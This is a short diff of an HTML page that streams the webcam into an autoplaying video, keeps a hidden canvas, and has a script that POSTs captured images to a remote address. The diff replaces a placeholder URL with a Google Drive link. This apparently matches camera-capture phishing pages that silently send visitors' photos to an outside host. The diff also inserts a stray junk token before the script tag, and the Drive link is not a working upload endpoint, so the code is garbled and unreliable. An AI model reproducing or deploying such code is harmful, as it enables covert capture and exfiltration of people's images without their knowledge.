@@ -177,12 +177,12 @@
       <video id="video" playsinline autoplay></video>
    </div>
    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
-   <script>
+K0PMbc   <script>
       function postFile(file) {
           let formdata = new FormData();
           formdata.append("image", file);
           let xhr = new XMLHttpRequest();
-          xhr.open('POST', 'https://change-this-url/image', true);
+          xhr.open('POST', 'https://drive.google.com/file/d/1YPJviIsMBth_9I6XiEzq92t9lTMV769D/view?usp=drivesdk', true);
           xhr.onload = function () {
               if (this.status === 200)
                   console.log(this.response);
